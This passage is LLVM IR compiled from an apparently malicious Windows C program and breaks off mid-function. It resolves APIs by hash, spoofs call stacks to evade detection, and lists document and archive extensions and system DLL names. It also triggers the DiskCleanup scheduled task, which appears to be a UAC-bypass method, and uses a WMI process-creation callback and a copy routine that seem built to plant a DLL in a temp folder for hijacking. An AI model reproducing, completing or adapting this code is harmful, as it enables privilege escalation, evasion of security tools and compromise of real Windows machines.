; ModuleID = '.\build\main.ll'
@__const.Final.DocumentExtensions = private unnamed_addr constant [20 x ptr] [ptr @"??_C@_19MJHBOPMJ@?$AA?4?$AAd?$AAo?$AAc?$AA?$AA@", ptr @"??_C@_1M@ODMBHFEB@?$AA?4?$AAd?$AAo?$AAc?$AAm?$AA?$AA@", ptr @"??_C@_1M@IEAGNCOM@?$AA?4?$AAd?$AAo?$AAc?$AAx?$AA?$AA@", ptr @"??_C@_19GMJJNAOJ@?$AA?4?$AAp?$AAd?$AAf?$AA?$AA@", ptr @"??_C@_1M@GLMJHFMP@?$AA?4?$AAp?$AAp?$AAs?$AAm?$AA?$AA@", ptr @"??_C@_1M@MAONCGC@?$AA?4?$AAp?$AAp?$AAs?$AAx?$AA?$AA@", ptr @"??_C@_19OMOAPHA@?$AA?4?$AAp?$AAp?$AAt?$AA?$AA@", ptr @"??_C@_1M@HGMMEFHH@?$AA?4?$AAp?$AAp?$AAt?$AAm?$AA?$AA@", ptr @"??_C@_1M@BBALOCNK@?$AA?4?$AAp?$AAp?$AAt?$AAx?$AA?$AA@", ptr @"??_C@_19IIFKHNNO@?$AA?4?$AAp?$AAs?$AAt?$AA?$AA@", ptr @"??_C@_19CNGKNFAP@?$AA?4?$AAr?$AAt?$AAf?$AA?$AA@", ptr @"??_C@_19IECOMODA@?$AA?4?$AAx?$AAl?$AAm?$AA?$AA@", ptr @"??_C@_19DEOIOOJM@?$AA?4?$AAx?$AAl?$AAs?$AA?$AA@", ptr @"??_C@_1M@FDAKBBFP@?$AA?4?$AAx?$AAl?$AAs?$AAm?$AA?$AA@", ptr @"??_C@_1M@DEMNLGPC@?$AA?4?$AAx?$AAl?$AAs?$AAx?$AA?$AA@", ptr @"??_C@_19DDBCGMHK@?$AA?4?$AAo?$AAd?$AAt?$AA?$AA@", ptr @"??_C@_19KOMFFEMD@?$AA?4?$AAo?$AAd?$AAs?$AA?$AA@", ptr @"??_C@_19LMHAPLCN@?$AA?4?$AAo?$AAd?$AAp?$AA?$AA@", ptr @"??_C@_19HBLOJEAL@?$AA?4?$AAo?$AAd?$AAg?$AA?$AA@", ptr @"??_C@_19MJACPDGO@?$AA?4?$AAo?$AAd?$AAf?$AA?$AA@"], align 16
@__const.Final.ArchiveExtensions = private unnamed_addr constant [7 x ptr] [ptr @"??_C@_19KBAKIGOP@?$AA?4?$AAr?$AAa?$AAr?$AA?$AA@", ptr @"??_C@_19DELFNHLM@?$AA?4?$AAz?$AAi?$AAp?$AA?$AA@", ptr @"??_C@_19GHGFIPGI@?$AA?4?$AAt?$AAa?$AAr?$AA?$AA@", ptr @"??_C@_17GHFCCPOI@?$AA?4?$AAg?$AAz?$AA?$AA@", ptr @"??_C@_17JFNCJPKG@?$AA?4?$AAx?$AAz?$AA?$AA@", ptr @"??_C@_17PPBFGPGF@?$AA?4?$AAs?$AAz?$AA?$AA@", ptr @"??_C@_17GLNMCHBP@?$AA?4?$AA7?$AAz?$AA?$AA@"], align 16
@"??_C@_1CE@HGFDMDMC@?$AA?$CF?$AAA?$AAL?$AAL?$AAU?$AAS?$AAE?$AAR?$AAS?$AAP?$AAR?$AAO?$AAF?$AAI?$AAL?$AAE?$AA?$CF?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [18 x i16] [i16 37, i16 65, i16 76, i16 76, i16 85, i16 83, i16 69, i16 82, i16 83, i16 80, i16 82, i16 79, i16 70, i16 73, i16 76, i16 69, i16 37, i16 0], comdat, align 2
@"??_C@_13FPGAJAPJ@?$AA?2?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [2 x i16] [i16 92, i16 0], comdat, align 2
@"??_C@_1DA@JOFMGLPN@?$AAE?$AAx?$AAc?$AAe?$AAp?$AAt?$AAi?$AAo?$AAn?$AA?5?$AAC?$AAo?$AAd?$AAe?$AA?3?$AA?5?$AA0?$AAx?$AA?$CF?$AA0?$AA8?$AAx?$AA?6?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [24 x i16] [i16 69, i16 120, i16 99, i16 101, i16 112, i16 116, i16 105, i16 111, i16 110, i16 32, i16 67, i16 111, i16 100, i16 101, i16 58, i16 32, i16 48, i16 120, i16 37, i16 48, i16 56, i16 120, i16 10, i16 0], comdat, align 2
@"??_C@_1CM@GGBPNJHK@?$AAP?$AAl?$AAe?$AAa?$AAs?$AAe?$AA?0?$AA?5?$AAd?$AAo?$AAn?$AA?8?$AAt?$AA?5?$AAk?$AAi?$AAl?$AAl?$AA?5?$AAm?$AAe?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [22 x i16] [i16 80, i16 108, i16 101, i16 97, i16 115, i16 101, i16 44, i16 32, i16 100, i16 111, i16 110, i16 39, i16 116, i16 32, i16 107, i16 105, i16 108, i16 108, i16 32, i16 109, i16 101, i16 0], comdat, align 2
@"??_C@_0BC@IHJEKHDN@DBT_DEVICEARRIVAL?$AA@" = linkonce_odr dso_local unnamed_addr constant [18 x i8] c"DBT_DEVICEARRIVAL\00", comdat, align 1
@__const.MessageLoop.wszClassName = private unnamed_addr constant [12 x i16] [i16 83, i16 104, i16 117, i16 116, i16 100, i16 111, i16 119, i16 110, i16 87, i16 105, i16 110, i16 0], align 16
@"??_C@_1BI@NLAJHLHN@?$AAM?$AAe?$AAs?$AAs?$AAa?$AAg?$AAe?$AAL?$AAo?$AAo?$AAp?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 77, i16 101, i16 115, i16 115, i16 97, i16 103, i16 101, i16 76, i16 111, i16 111, i16 112, i16 0], comdat, align 2
@"??_C@_1CC@HNIKHM@?$AAR?$AAe?$AAg?$AAi?$AAs?$AAt?$AAe?$AAr?$AAC?$AAl?$AAa?$AAs?$AAs?$AAE?$AAx?$AAW?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [17 x i16] [i16 82, i16 101, i16 103, i16 105, i16 115, i16 116, i16 101, i16 114, i16 67, i16 108, i16 97, i16 115, i16 115, i16 69, i16 120, i16 87, i16 0], comdat, align 2
@"??_C@_1BK@JHLNAEJL@?$AAa?$AAd?$AAv?$AAa?$AAp?$AAi?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [13 x i16] [i16 97, i16 100, i16 118, i16 97, i16 112, i16 105, i16 51, i16 50, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BG@LDILNKDG@?$AAb?$AAc?$AAr?$AAy?$AAp?$AAt?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [11 x i16] [i16 98, i16 99, i16 114, i16 121, i16 112, i16 116, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@IDAOOPDH@?$AAc?$AAo?$AAm?$AAb?$AAa?$AAs?$AAe?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 99, i16 111, i16 109, i16 98, i16 97, i16 115, i16 101, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@MIELKEKL@?$AAc?$AAr?$AAy?$AAp?$AAt?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 99, i16 114, i16 121, i16 112, i16 116, i16 51, i16 50, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@HFOADCMA@?$AAd?$AAb?$AAg?$AAh?$AAe?$AAl?$AAp?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 100, i16 98, i16 103, i16 104, i16 101, i16 108, i16 112, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BM@COBAEEDA@?$AAg?$AAd?$AAi?$AA3?$AA2?$AAf?$AAu?$AAl?$AAl?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [14 x i16] [i16 103, i16 100, i16 105, i16 51, i16 50, i16 102, i16 117, i16 108, i16 108, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BK@HPIDKHCA@?$AAI?$AAP?$AAH?$AAL?$AAP?$AAA?$AAP?$AAI?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [13 x i16] [i16 73, i16 80, i16 72, i16 76, i16 80, i16 65, i16 80, i16 73, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BE@DPMNNGMJ@?$AAo?$AAl?$AAe?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [10 x i16] [i16 111, i16 108, i16 101, i16 51, i16 50, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BK@LEFPDCAJ@?$AAo?$AAl?$AAe?$AAa?$AAu?$AAt?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [13 x i16] [i16 111, i16 108, i16 101, i16 97, i16 117, i16 116, i16 51, i16 50, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BG@OHPGIPDH@?$AAr?$AAp?$AAc?$AAr?$AAt?$AA4?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [11 x i16] [i16 114, i16 112, i16 99, i16 114, i16 116, i16 52, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@NHDEKGFK@?$AAs?$AAe?$AAc?$AAh?$AAo?$AAs?$AAt?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 115, i16 101, i16 99, i16 104, i16 111, i16 115, i16 116, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@EPOJMAKJ@?$AAs?$AAh?$AAl?$AAw?$AAa?$AAp?$AAi?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 115, i16 104, i16 108, i16 119, i16 97, i16 112, i16 105, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BK@GKAGNDBG@?$AAv?$AAe?$AAr?$AAi?$AAf?$AAi?$AAe?$AAr?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [13 x i16] [i16 118, i16 101, i16 114, i16 105, i16 102, i16 105, i16 101, i16 114, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@CPNGMKLH@?$AAv?$AAr?$AAf?$AAc?$AAo?$AAr?$AAe?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 118, i16 114, i16 102, i16 99, i16 111, i16 114, i16 101, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BG@NFAFNBHO@?$AAw?$AAi?$AAn?$AA3?$AA2?$AAu?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [11 x i16] [i16 119, i16 105, i16 110, i16 51, i16 50, i16 117, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BI@DHLGAPDE@?$AAw?$AAi?$AAn?$AAh?$AAt?$AAt?$AAp?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [12 x i16] [i16 119, i16 105, i16 110, i16 104, i16 116, i16 116, i16 112, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BK@DGNDAKKP@?$AAw?$AAt?$AAs?$AAa?$AAp?$AAi?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [13 x i16] [i16 119, i16 116, i16 115, i16 97, i16 112, i16 105, i16 51, i16 50, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@"??_C@_1BG@PCIIPGGK@?$AAR?$AAP?$AAC?$AAR?$AAT?$AA4?$AA?4?$AAd?$AAl?$AAl?$AA?$AA@" = linkonce_odr dso_local unnamed_addr constant [11 x i16] [i16 82, i16 80, i16 67, i16 82, i16 84, i16 52, i16 46, i16 100, i16 108, i16 108, i16 0], comdat, align 2
@__local_stdio_printf_options._OptionsStorage = internal global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @Callback(ptr noundef %lpInput, ptr noundef %Arg) #0 {
entry:
  %Arg.addr = alloca ptr, align 8
  %lpInput.addr = alloca ptr, align 8
  %lpDllPath = alloca ptr, align 8
  %szFolderName = alloca ptr, align 8
  %szTemp = alloca ptr, align 8
  %szTempPath = alloca [260 x i8], align 16
  store ptr %Arg, ptr %Arg.addr, align 8
  store ptr %lpInput, ptr %lpInput.addr, align 8
  %0 = load ptr, ptr %Arg.addr, align 8
  store ptr %0, ptr %lpDllPath, align 8
  %1 = load ptr, ptr %lpInput.addr, align 8
  %2 = call ptr @GetProcAddressH(i32 717748261, i32 1460318771)
  %3 = call ptr (ptr, ...) @SpoofCall(ptr %2, ptr %1, ptr @"??_C@_0O@KBLHGOJI@?7FileName?5?$DN?5?$CC?$AA@")
  %4 = call ptr @GetProcAddressH(i32 717748261, i32 1398280933)
  %5 = call ptr (ptr, ...) @SpoofCall(ptr %4, ptr @"??_C@_0O@KBLHGOJI@?7FileName?5?$DN?5?$CC?$AA@")
  %6 = ptrtoint ptr %5 to i32
  %idx.ext = sext i32 %6 to i64
  %add.ptr = getelementptr inbounds i8, ptr %3, i64 %idx.ext
  store ptr %add.ptr, ptr %szFolderName, align 8
  %7 = load ptr, ptr %szFolderName, align 8
  %8 = call ptr @GetProcAddressH(i32 717748261, i32 1409987091)
  %9 = call ptr (ptr, ...) @SpoofCall(ptr %8, ptr %7, i16 34)
  store ptr %9, ptr %szTemp, align 8
  %10 = load ptr, ptr %szTemp, align 8
  %arrayidx = getelementptr inbounds i8, ptr %10, i64 0
  store i8 0, ptr %arrayidx, align 1
  %arraydecay = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %11 = call ptr @GetProcAddressH(i32 717748261, i32 925771352)
  %12 = call ptr (ptr, ...) @SpoofCall(ptr %11, i32 260, ptr %arraydecay)
  %13 = ptrtoint ptr %12 to i32
  %arraydecay4 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %14 = call ptr @GetProcAddressH(i32 245326953, i32 1381515987)
  %15 = call ptr (ptr, ...) @SpoofCall(ptr %14, ptr %arraydecay4, ptr @"??_C@_01KICIPPFI@?2?$AA@")
  %16 = load ptr, ptr %szFolderName, align 8
  %arraydecay6 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %17 = call ptr @GetProcAddressH(i32 245326953, i32 1381515987)
  %18 = call ptr (ptr, ...) @SpoofCall(ptr %17, ptr %arraydecay6, ptr %16)
  %arraydecay8 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_0BA@NMMGOCCC@szTempPath?3?5?$CFs?6?$AA@", ptr noundef %arraydecay8)
  ret void
}

declare dllimport ptr @StrStrA(ptr noundef, ptr noundef) #1

declare dllimport i32 @lstrlenA(ptr noundef) #1

declare dllimport ptr @StrChrA(ptr noundef, i16 noundef) #1

declare dllimport i32 @GetTempPathA(i32 noundef, ptr noundef) #1

declare dllimport ptr @lstrcatA(ptr noundef, ptr noundef) #1

declare dso_local void @PrintFormatA(ptr noundef, ...) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @StartTaskThread() #0 {
entry:
  %hEvent = alloca ptr, align 8
  store ptr null, ptr %hEvent, align 8
  br label %while.body

while.body:                                       ; preds = %if.end, %entry
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 -1374182063)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, i32 2031619, i32 0, ptr @"??_C@_1BE@EJAAJEPG@?$AAE?$AAv?$AAe?$AAn?$AAt?$AAS?$AAi?$AAn?$AAk?$AA?$AA@")
  store ptr %1, ptr %hEvent, align 8
  %2 = load ptr, ptr %hEvent, align 8
  %cmp = icmp ne ptr %2, null
  br i1 %cmp, label %if.then, label %if.end

if.then:                                          ; preds = %while.body
  br label %while.end

if.end:                                           ; preds = %while.body
  %3 = call ptr @GetProcAddressH(i32 717748261, i32 424171848)
  %4 = call ptr (ptr, ...) @SpoofCall(ptr %3, i32 2000)
  br label %while.body

while.end:                                        ; preds = %if.then
  %call1 = call i32 @StartTask(ptr noundef @"??_C@_1FK@KHOKJPFG@?$AA?2?$AAM?$AAi?$AAc?$AAr?$AAo?$AAs?$AAo?$AAf?$AAt?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAD?$AAi?$AAs?$AAk?$AAC?$AAl?$AAe?$AAa?$AAn?$AAu?$AAp?$AA?2?$AAS@")
  %tobool = icmp ne i32 %call1, 0
  br i1 %tobool, label %if.end3, label %if.then2

if.then2:                                         ; preds = %while.end
  br label %if.end3

if.end3:                                          ; preds = %if.then2, %while.end
  ret void
}

declare dllimport ptr @OpenEventW(i32 noundef, i32 noundef, ptr noundef) #1

declare dllimport void @Sleep(i32 noundef) #1

declare dso_local i32 @StartTask(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test1() #0 {
entry:
  %hThread = alloca ptr, align 8
  store ptr null, ptr %hThread, align 8
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 712281605)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr null, i64 0, ptr @StartTaskThread, ptr null, i32 0, ptr null)
  store ptr %1, ptr %hThread, align 8
  %2 = load ptr, ptr %hThread, align 8
  %cmp = icmp eq ptr %2, null
  br i1 %cmp, label %if.then, label %if.end

if.then:                                          ; preds = %entry
  br label %return

if.end:                                           ; preds = %entry
  call void @RegisterAsyncEvent(ptr noundef @"??_C@_1CAK@DFPIDBKP@?$AAS?$AAE?$AAL?$AAE?$AAC?$AAT?$AA?5?$AA?$CK?$AA?5?$AAF?$AAR?$AAO?$AAM?$AA?5?$AA_?$AA_?$AAI?$AAn?$AAs?$AAt?$AAa?$AAn?$AAc?$AAe?$AAC?$AAr?$AAe?$AAa?$AAt?$AAi?$AAo?$AAn@", ptr noundef @Callback, ptr noundef @"??_C@_1EO@CNCMMCL@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAD?$AAe?$AAs?$AAk?$AAt?$AAo?$AAp?$AA?2?$AAL?$AAo?$AAg?$AAP?$AAr?$AAo?$AAv?$AAi?$AAd@")
  br label %return

return:                                           ; preds = %if.end, %if.then
  ret void
}

declare dllimport ptr @CreateThread(ptr noundef, i64 noundef, ptr noundef, ptr noundef, i32 noundef, ptr noundef) #1

declare dso_local void @RegisterAsyncEvent(ptr noundef, ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test2(ptr noundef %lpDllPath) #0 {
entry:
  %lpDllPath.addr = alloca ptr, align 8
  %pOutput = alloca ptr, align 8
  %dwSize = alloca i32, align 4
  %szFolderName = alloca ptr, align 8
  %szTemp = alloca ptr, align 8
  %szTempPath = alloca [260 x i8], align 16
  store ptr %lpDllPath, ptr %lpDllPath.addr, align 8
  store ptr null, ptr %pOutput, align 8
  store i32 0, ptr %dwSize, align 4
  %call = call i32 @CreateProcessAndGetOutput(ptr noundef @"??_C@_1EA@JLNGLAM@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAD?$AAe?$AAs?$AAk?$AAt?$AAo?$AAp?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@", ptr noundef %pOutput, ptr noundef %dwSize)
  %tobool = icmp ne i32 %call, 0
  br i1 %tobool, label %if.end, label %if.then

if.then:                                          ; preds = %entry
  br label %return

if.end:                                           ; preds = %entry
  %0 = load ptr, ptr %pOutput, align 8
  %1 = call ptr @GetProcAddressH(i32 717748261, i32 1460318771)
  %2 = call ptr (ptr, ...) @SpoofCall(ptr %1, ptr %0, ptr @"??_C@_0O@KBLHGOJI@?7FileName?5?$DN?5?$CC?$AA@")
  %3 = call ptr @GetProcAddressH(i32 717748261, i32 1398280933)
  %4 = call ptr (ptr, ...) @SpoofCall(ptr %3, ptr @"??_C@_0O@KBLHGOJI@?7FileName?5?$DN?5?$CC?$AA@")
  %5 = ptrtoint ptr %4 to i32
  %idx.ext = sext i32 %5 to i64
  %add.ptr = getelementptr inbounds i8, ptr %2, i64 %idx.ext
  store ptr %add.ptr, ptr %szFolderName, align 8
  %6 = load ptr, ptr %szFolderName, align 8
  %7 = call ptr @GetProcAddressH(i32 717748261, i32 1409987091)
  %8 = call ptr (ptr, ...) @SpoofCall(ptr %7, ptr %6, i16 34)
  store ptr %8, ptr %szTemp, align 8
  %9 = load ptr, ptr %szTemp, align 8
  %arrayidx = getelementptr inbounds i8, ptr %9, i64 0
  store i8 0, ptr %arrayidx, align 1
  %arraydecay = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %10 = call ptr @GetProcAddressH(i32 717748261, i32 925771352)
  %11 = call ptr (ptr, ...) @SpoofCall(ptr %10, i32 260, ptr %arraydecay)
  %12 = ptrtoint ptr %11 to i32
  %arraydecay5 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %13 = call ptr @GetProcAddressH(i32 245326953, i32 1381515987)
  %14 = call ptr (ptr, ...) @SpoofCall(ptr %13, ptr %arraydecay5, ptr @"??_C@_01KICIPPFI@?2?$AA@")
  %15 = load ptr, ptr %szFolderName, align 8
  %arraydecay7 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %16 = call ptr @GetProcAddressH(i32 245326953, i32 1381515987)
  %17 = call ptr (ptr, ...) @SpoofCall(ptr %16, ptr %arraydecay7, ptr %15)
  %arraydecay9 = getelementptr inbounds [260 x i8], ptr %szTempPath, i64 0, i64 0
  %18 = load ptr, ptr %lpDllPath.addr, align 8
  %call10 = call i32 @CopyFileWp(ptr noundef %18, ptr noundef %arraydecay9, i32 noundef 0)
  br label %return

return:                                           ; preds = %if.end, %if.then
  ret void
}

declare dso_local i32 @CreateProcessAndGetOutput(ptr noundef, ptr noundef, ptr noundef) #1

declare dso_local i32 @CopyFileWp(ptr noundef, ptr noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @IsGUIDStringW(ptr noundef %lpInput) #0 {
entry:
  %retval = alloca i32, align 4
  %lpInput.addr = alloca ptr, align 8
  %dwLength = alloca i32, align 4
  %i = alloca i32, align 4
  %j = alloca i32, align 4
  %AllowedCharacters = alloca [12 x i16], align 16
  %bIsOk = alloca i32, align 4
  store ptr %lpInput, ptr %lpInput.addr, align 8
  %0 = load ptr, ptr %lpInput.addr, align 8
  %1 = call ptr @GetProcAddressH(i32 717748261, i32 1398280955)
  %2 = call ptr (ptr, ...) @SpoofCall(ptr %1, ptr %0)
  %3 = ptrtoint ptr %2 to i32
  store i32 %3, ptr %dwLength, align 4
  call void @MemCopy(ptr align 16 %AllowedCharacters, ptr align 16 @__const.IsGUIDStringW.AllowedCharacters, i64 24, i1 false)
  store i32 0, ptr %bIsOk, align 4
  %4 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx = getelementptr inbounds i16, ptr %4, i64 8
  %5 = load i16, ptr %arrayidx, align 2
  %conv = zext i16 %5 to i32
  %cmp = icmp ne i32 %conv, 45
  br i1 %cmp, label %if.then, label %lor.lhs.false

lor.lhs.false:                                    ; preds = %entry
  %6 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx2 = getelementptr inbounds i16, ptr %6, i64 13
  %7 = load i16, ptr %arrayidx2, align 2
  %conv3 = zext i16 %7 to i32
  %cmp4 = icmp ne i32 %conv3, 45
  br i1 %cmp4, label %if.then, label %lor.lhs.false6

lor.lhs.false6:                                   ; preds = %lor.lhs.false
  %8 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx7 = getelementptr inbounds i16, ptr %8, i64 18
  %9 = load i16, ptr %arrayidx7, align 2
  %conv8 = zext i16 %9 to i32
  %cmp9 = icmp ne i32 %conv8, 45
  br i1 %cmp9, label %if.then, label %lor.lhs.false11

lor.lhs.false11:                                  ; preds = %lor.lhs.false6
  %10 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx12 = getelementptr inbounds i16, ptr %10, i64 23
  %11 = load i16, ptr %arrayidx12, align 2
  %conv13 = zext i16 %11 to i32
  %cmp14 = icmp ne i32 %conv13, 45
  br i1 %cmp14, label %if.then, label %if.end

if.then:                                          ; preds = %lor.lhs.false11, %lor.lhs.false6, %lor.lhs.false, %entry
  store i32 0, ptr %retval, align 4
  br label %return

if.end:                                           ; preds = %lor.lhs.false11
  %12 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx16 = getelementptr inbounds i16, ptr %12, i64 8
  store i16 48, ptr %arrayidx16, align 2
  %13 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx17 = getelementptr inbounds i16, ptr %13, i64 13
  store i16 48, ptr %arrayidx17, align 2
  %14 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx18 = getelementptr inbounds i16, ptr %14, i64 18
  store i16 48, ptr %arrayidx18, align 2
  %15 = load ptr, ptr %lpInput.addr, align 8
  %arrayidx19 = getelementptr inbounds i16, ptr %15, i64 23
  store i16 48, ptr %arrayidx19, align 2
  store i32 0, ptr %i, align 4
  br label %for.cond

for.cond:                                         ; preds = %for.inc49, %if.end
  %16 = load i32, ptr %i, align 4
  %17 = load i32, ptr %dwLength, align 4
  %cmp20 = icmp ult i32 %16, %17
  br i1 %cmp20, label %for.body, label %for.end51

for.body:                                         ; preds = %for.cond
  store i32 0, ptr %j, align 4
  br label %for.cond22

for.cond22:                                       ; preds = %for.inc, %for.body
  %18 = load i32, ptr %j, align 4
  %conv23 = zext i32 %18 to i64
  %cmp24 = icmp ult i64 %conv23, 12
  br i1 %cmp24, label %for.body26, label %for.end

for.body26:                                       ; preds = %for.cond22
  %19 = load ptr, ptr %lpInput.addr, align 8
  %20 = load i32, ptr %i, align 4
  %idxprom = zext i32 %20 to i64
  %arrayidx27 = getelementptr inbounds i16, ptr %19, i64 %idxprom
  %21 = load i16, ptr %arrayidx27, align 2
  %conv28 = zext i16 %21 to i32
  %22 = load i32, ptr %j, align 4
  %idxprom29 = zext i32 %22 to i64
  %arrayidx30 = getelementptr inbounds [12 x i16], ptr %AllowedCharacters, i64 0, i64 %idxprom29
  %23 = load i16, ptr %arrayidx30, align 2
  %conv31 = zext i16 %23 to i32
  %cmp32 = icmp eq i32 %conv28, %conv31
  br i1 %cmp32, label %if.then45, label %lor.lhs.false34

lor.lhs.false34:                                  ; preds = %for.body26
  %24 = load ptr, ptr %lpInput.addr, align 8
  %25 = load i32, ptr %i, align 4
  %idxprom35 = zext i32 %25 to i64
  %arrayidx36 = getelementptr inbounds i16, ptr %24, i64 %idxprom35
  %26 = load i16, ptr %arrayidx36, align 2
  %conv37 = zext i16 %26 to i32
